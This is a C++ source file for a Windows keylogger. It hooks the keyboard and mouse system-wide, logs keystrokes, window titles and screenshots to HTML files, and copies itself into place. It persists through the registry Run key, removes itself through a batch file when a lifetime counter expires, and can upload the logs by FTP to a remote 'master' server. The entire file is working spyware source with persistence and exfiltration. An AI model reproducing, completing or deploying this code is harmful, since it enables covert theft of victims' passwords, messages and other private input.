#include "keylogger.h"
#include "tableCSS.h"

using namespace std;

KeyLogger* KeyLogger::instance = NULL;

void KeyLogger::persist(std::string path) {
    
    if (path.empty()) {
        path = programPath;
    }

    HKEY key;
    RegCreateKey(
        HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        &key
    );

    std::string keyValue = "\"";

    keyValue += path;

    keyValue += "\"";
    
    //launch at startup
    RegSetValueEx(key, REGKEY_PERSIST, 0, REG_SZ, (BYTE*)keyValue.c_str(), keyValue.length());
    
    //set life time
    RegSetValueEx(key, REGKEY_LIFETIME, 0, REG_SZ, (BYTE*)KEYLOGGER_LIFETIME, sizeof(KEYLOGGER_LIFETIME));
}

void KeyLogger::uninstall() {
    
    //don't launch again
    HKEY key;
    RegCreateKey(
        HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        &key
        );
    RegDeleteValue(key, REGKEY_PERSIST);
    
    //remove lifetime key
    RegDeleteValue(key, "lifespan");

    //delete program files and exit
    removeSelf();
}

void KeyLogger::updateLifespan() {
    
    char buffer[100];
    DWORD buffSize = sizeof(buffer);
    
    //check remaining life time
    HKEY key;
    RegCreateKey(
        HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        &key
        ); 
    
    RegQueryValueEx(
        key,
        REGKEY_LIFETIME,
        0,
        NULL,
        (BYTE*)buffer,
        &buffSize
        );
    
    //decrement it
    int lifespan = atoi(buffer);
    lifespan--;
    
    //uninstall the app if it's time
    if (lifespan < 0) {
        uninstall();
    }
    
    //else just decrement the lifespan
    _itoa_s(lifespan, buffer, 10);

    RegSetValueEx(
        key,
        REGKEY_LIFETIME,
        NULL,
        REG_SZ,
        (BYTE*)buffer,
        sizeof(buffer)
    );

}

void KeyLogger::removeSelf() {
    
    //make sure everything is freed
    freeResources();

    //create a batch fil that will delete program files after execution stops
    ofstream batchFile;
    batchFile.open(BATCH_NAME);
    batchFile << "@echo off" << endl;
    batchFile << ":Repeat" << endl;
    batchFile << "del " << programPath << endl;
    batchFile << "rmdir /s /q " << programDir << DATADIR << endl;
    batchFile << "if exist " << programPath << " goto Repeat" << endl;
    batchFile << "del " << BATCH_NAME << endl;
    batchFile.close();
    system("start cleaner.bat");

    //exit ASAP
    exit(0);
}

void KeyLogger::freeResources() {
    
    logFile.close();
    UnhookWindowsHookEx(khook);
    UnhookWindowsHookEx(mhook);
}

std::string KeyLogger::removeFilespec(std::string path) {

    while (path[path.length() - 1] != '\\') {
        path.erase(path.length() - 1);
    }

    return path;
}

KeyLogger::KeyLogger() {

    lshiftDown = false;
    rshiftDown = false;
    laltDown = false;
    raltDown = false;
    lctrlDown = false;
    rctrlDown = false;

    char buffer[1024];
    GetModuleFileName(NULL, buffer, sizeof(buffer));
    
    programPath = buffer;
    programDir = removeFilespec(programPath);
    
    activeWindowTitle = getActiveWindowTitle();

    useFTP = false;

    char hostnameBuff[200];
    gethostname(hostnameBuff, sizeof(hostnameBuff));
    hostname = hostnameBuff;

    mapKeys();
}

void KeyLogger::mapKeys() {

    char ASCII[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890²&é\"'(-è_çà~#{[|`\\^@)=°+]}¨$£¤ù%*µ!§:/;.,?<>";

    for (int i = 0; i < sizeof(ASCII); i++) {
        kbdToAscii[VkKeyScanEx(ASCII[i], GetKeyboardLayout(NULL))] = ASCII[i];
    }

    specialKeys[VK_SPACE] = " ";
    specialKeys[VK_BACK] = "[BACKSPACE]";
    specialKeys[VK_TAB] = "[TAB]";
    specialKeys[VK_RETURN] = "[RETURN]<br />";
    specialKeys[VK_PAUSE] = "[PAUSE]";
    specialKeys[VK_CAPITAL] = "[CAPS LOCK]";
    specialKeys[VK_ESCAPE] = "[ESC]";
    specialKeys[VK_PRIOR] = "[PAGE UP]";
    specialKeys[VK_NEXT] = "[PAGE DOWN]";
    specialKeys[VK_HOME] = "[HOME]";
    specialKeys[VK_LEFT] = "[LEFT ARROW]";
    specialKeys[VK_RIGHT] = "[RIGH ARROW]";
    specialKeys[VK_UP] = "[UP ARROW]";
    specialKeys[VK_DOWN] = "[DOWN ARROW]";
    specialKeys[VK_INSERT] = "[INSERT]";
    specialKeys[VK_DELETE] = "[DELETE]";
    specialKeys[VK_LWIN] = "[LEFT WINDOWS]";
    specialKeys[VK_RWIN] = "[RIGHT WINDOWS]";
    specialKeys[VK_NUMLOCK] = "[NUMLOCK]";
    specialKeys[VK_NUMPAD0] = "[NUM 0]";
    specialKeys[VK_NUMPAD1] = "[NUM 1]";
    specialKeys[VK_NUMPAD2] = "[NUM 2]";
    specialKeys[VK_NUMPAD3] = "[NUM 3]";
    specialKeys[VK_NUMPAD4] = "[NUM 4]";
    specialKeys[VK_NUMPAD5] = "[NUM 5]";
    specialKeys[VK_NUMPAD6] = "[NUM 6]";
    specialKeys[VK_NUMPAD7] = "[NUM 7]";
    specialKeys[VK_NUMPAD8] = "[NUM 8]";
    specialKeys[VK_NUMPAD9] = "[NUM 9]";
    specialKeys[VK_MULTIPLY] = "*";
    specialKeys[VK_ADD] = "+";
    specialKeys[VK_SUBTRACT] = "-";
    specialKeys[VK_DIVIDE] = "/";
    specialKeys[VK_F1] = "[F1]";
    specialKeys[VK_F2] = "[F2]";
    specialKeys[VK_F3] = "[F3]";
    specialKeys[VK_F4] = "[F4]";
    specialKeys[VK_F5] = "[F5]";
    specialKeys[VK_F6] = "[F6]";
    specialKeys[VK_F7] = "[F7]";
    specialKeys[VK_F8] = "[F8]";
    specialKeys[VK_F9] = "[F9]";
    specialKeys[VK_F10] = "[F10]";
    specialKeys[VK_F11] = "[F11]";
    specialKeys[VK_F12] = "[F12]";
}

KeyLogger::~KeyLogger() {

    freeResources();
}

KeyLogger* KeyLogger::getInstance() {

    if(instance == NULL) {
        instance = new KeyLogger();
        }

    return instance;
}

void KeyLogger::releaseInstance() {

    if(instance != NULL) {
        delete instance;
        instance = NULL;
    }
}

std::string KeyLogger::keycodeToString(int keyCode) {
    std::string text;
    text += kbdToAscii[keyCode];
    return text;
}

LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {

    KeyLogger* keylogger = getInstance();

    if (nCode >= 0) {

        //key pressed
        if(wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {

            KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*) lParam);

            switch (hooked.vkCode) {
                case VK_LSHIFT:
                    keylogger->setLShiftDown(true);
                    break;
                case VK_RSHIFT:
                    keylogger->setRShiftDown(true);
                    break;
                case VK_LMENU:
                    keylogger->setLAltDown(true);
                    break;
                case VK_RMENU:
                    keylogger->setRAltDown(true);
                    break;
                case VK_LCONTROL:
                    keylogger->setLCtrlDown(true);
                    break;
                case VK_RCONTROL:
                    keylogger->setRCtrlDown(true);
                    break;
                default:
                    keylogger->log(hooked.vkCode);
                    break;
            }
        }

        //key released
        if(wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {

            KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*) lParam);

            switch(hooked.vkCode) {

                case VK_LSHIFT:
                    keylogger->setLShiftDown(false);
                    break;
                case VK_RSHIFT:
                    keylogger->setRShiftDown(false);
                    break;
                case VK_LMENU:
                    keylogger->setLAltDown(false);
                    break;
                case VK_RMENU:
                    keylogger->setRAltDown(false);
                    break;
                case VK_LCONTROL:
                    keylogger->setLCtrlDown(false);
                    break;
                case VK_RCONTROL:
                    keylogger->setRCtrlDown(false);
                    break;
                default:
                    break;
            }
        }

        //mouse clicked
        if (wParam == WM_LBUTTONDOWN) {

            MSLLHOOKSTRUCT hooked = *((MSLLHOOKSTRUCT*)lParam);
            std::stringstream logStr;
            logStr << "[LMOUSE (" << hooked.pt.x << ", " << hooked.pt.y << ") ]<br />";
            keylogger->log(logStr.str());
        }

    }

    return CallNextHookEx(keylogger->khook, nCode, wParam, lParam);
}

std::string KeyLogger::screenshot() {

    std::stringstream fileName;
    fileName << programDir << DATADIR << "\\" <<  time(NULL) << ".bmp";
    takeScreenshot(GetDesktopWindow(), fileName.str());

    log("[SCREENSHOT " + fileName.str() + "]<br />");

    return fileName.str();
}

void KeyLogger::loop() {

    MSG message;
    while (GetMessage(&message, NULL, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
}

void KeyLogger::listen() {

    HINSTANCE instance = GetModuleHandle(NULL);
    if (!instance) {
        exit(1);
    }

    khook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)hookFunction, instance, 0);
    mhook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)hookFunction, instance, 0);
    
    CreateDirectory(std::string(programDir + DATADIR).c_str(), NULL);

    logFileName << programDir << DATADIR << "\\" << hostname << "(" << time(NULL) << ").html";
    
    ifstream logCheck(logFileName.str());
    bool exists = logCheck.good();
    logCheck.close();
    
    logFile.open(logFileName.str(), ios::app);
    if (!exists) {
        logFile << TABLE_CSS;
        logFile << "<table class=\"table\"><tr><td>Time</td><td>Window</td><td width=\"50%\">Key strokes</td></tr>";
    }
}

void KeyLogger::log(int vkCode) {

    std::map<int, std::string>::iterator found = specialKeys.find(vkCode);
    
    if (found != specialKeys.end()) {
        log(found->second);
    }

    else {
        // formatting scan code and shift state for the VkKeyScan function 
        // http://msdn.microsoft.com/en-us/library/windows/desktop/ms646329%28v=vs.85%29.aspx
        int keyCode = 0;
        if (isLShiftDown() || isRShiftDown()) {
            keyCode += 1;
        }
        if (isLCtrlDown() || isRCtrlDown()) {
            keyCode += 2;
        }
        if (isLAltDown() || isRAltDown()) {
            keyCode += 4;
        }
        keyCode = keyCode << 8;
        keyCode += vkCode;

        std::string keyString = keycodeToString(keyCode);
        log(keyString);
    }
}

void KeyLogger::log(std::string text) {
    
    //user switched windows
    if (getActiveWindowTitle() != activeWindowTitle) {
        writeBuffer();//dump last window's information to file
    }

    keyboardBuffer += text;
}

void KeyLogger::install(std::string target) {
    
    //already installed
    if (target == programPath) {
        updateLifespan();
        return;
    }

    //install keylogger and exit
    CopyFile(programPath.c_str(), target.c_str(), true);

    persist(target);
    
    removeSelf();
}

void KeyLogger::writeBuffer()
{
    logFile << "<tr><td>" << getTimeString() << "</td><td>" << activeWindowTitle << "</td><td style=\"word-wrap: break-word\">" << keyboardBuffer << "</td></tr>";
    #ifdef USE_FTP
    //upload to master server if it's time
    if (useFTP && time(NULL) - lastUpload > UPLOAD_DELTA) {
        lastUpload = time(NULL);
        upload();
    }
    #endif
    
    activeWindowTitle = getActiveWindowTitle();
    keyboardBuffer = "";    
}

std::string KeyLogger::getTimeString() {

    time_t currentTime = time(NULL);

    tm gmt;
    gmtime_s(&gmt, &currentTime);
    
    std::stringstream timeString;
    
    timeString << gmt.tm_mday << "/" << gmt.tm_mon + 1 << "/" << gmt.tm_year + 1900  << " at " << (gmt.tm_hour + 1) % 24 << ":";

    gmt.tm_min < 9 ? timeString << "0" << gmt.tm_min : timeString << gmt.tm_min;

    return timeString.str();
}

std::string KeyLogger::getActiveWindowTitle() {

    char title[256];
    HWND hwnd = GetForegroundWindow();
    GetWindowText(hwnd, title, sizeof(title));
    return std::string(title);
}

std::string KeyLogger::getUserHomeDirectory() {

    char buffer[1024];
    GetEnvironmentVariable("USERPROFILE", buffer, sizeof(buffer));
    strcat_s(buffer, "\\");

    return std::string(buffer);
}

#ifdef USE_FTP
void KeyLogger::upload() {
    
    ftpClient.connect(server, port);

    if (ftpClient.login(login, password).isOk()) {

        ftpClient.upload(logFileName.str(), uploadDir, sf::Ftp::Ascii);
    }
    
    ftpClient.disconnect();
}

void KeyLogger::setMaster(std::string _server, int _port, std::string _login, std::string _password, std::string _uploadDir) {
    
    useFTP = true;
    server = _server;
    port = _port;
    login = _login;
    password = _password;
    uploadDir = _uploadDir;
}
#endif